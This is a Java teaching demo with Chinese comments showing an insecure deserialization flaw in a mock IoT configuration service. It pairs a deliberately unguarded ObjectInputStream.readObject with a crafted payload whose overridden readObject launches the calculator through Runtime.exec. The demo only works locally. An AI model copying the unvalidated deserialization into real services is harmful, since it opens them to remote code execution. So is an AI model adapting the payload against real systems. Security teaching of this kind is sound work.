import java.io.*;
import java.util.Base64;
import java.util.function.Function;

/**
 * IoT设备配置类（存在漏洞的反序列化目标）
 */
class IoTDeviceConfig implements Serializable {
    private String deviceId;
    private transient Function<String, Void> callback;

    public IoTDeviceConfig(String deviceId) {
        this.deviceId = deviceId;
    }

    // 模拟设备控制逻辑
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        System.out.println("[INFO] 设备 " + deviceId + " 正在应用新配置...");
    }
}

/**
 * IoT设备管理服务（存在不安全反序列化漏洞）
 */
public class IoTDeviceManager {
    
    // 函数式接口模拟设备控制回调
    @FunctionalInterface
    interface DeviceControl {
        void execute(String command);
    }

    /**
     * 模拟从网络接收并处理设备配置
     * @param serializedData Base64编码的序列化数据
     */
    public static void handleRemoteConfig(String serializedData) {
        try (ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(Base64.getDecoder().decode(serializedData)))) {
            
            // 不安全的反序列化操作（漏洞点）
            IoTDeviceConfig config = (IoTDeviceConfig) ois.readObject();
            System.out.println("[SUCCESS] 已应用配置给设备: " + config.toString());
            
        } catch (Exception e) {
            System.err.println("[ERROR] 配置处理失败: " + e.getMessage());
        }
    }

    /**
     * 模拟攻击者构造恶意序列化数据
     */
    public static String createMaliciousPayload() throws Exception {
        // 使用Java原生序列化构造攻击载荷（示例：执行计算器）
        // 实际攻击可能使用CommonsCollections等gadget
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            // 模拟构造恶意对象链
            Object maliciousObject = new IoTDeviceConfig("malicious-device") {
                // 重写readObject触发任意代码执行
                private void readObject(ObjectInputStream in) {
                    try {
                        in.defaultReadObject();
                        // 模拟RCE攻击（实际攻击更复杂）
                        Runtime.getRuntime().exec("calc");
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                }
            };
            oos.writeObject(maliciousObject);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        System.out.println("=== IoT设备管理系统漏洞演示 ===");
        
        // 模拟正常操作
        System.out.println("\
[场景1] 正常设备配置应用:");
        IoTDeviceConfig normalConfig = new IoTDeviceConfig("device-001");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(normalConfig);
        String safeData = Base64.getEncoder().encodeToString(baos.toByteArray());
        handleRemoteConfig(safeData);
        
        // 模拟攻击场景
        System.out.println("\
[场景2] 恶意攻击载荷检测:");
        String maliciousData = createMaliciousPayload();
        System.out.println("[PAYLOAD] 生成恶意数据: " + maliciousData.substring(0, 50) + "...");
        System.out.println("[ATTACK] 正在触发远程代码执行...");
        handleRemoteConfig(maliciousData);
    }
}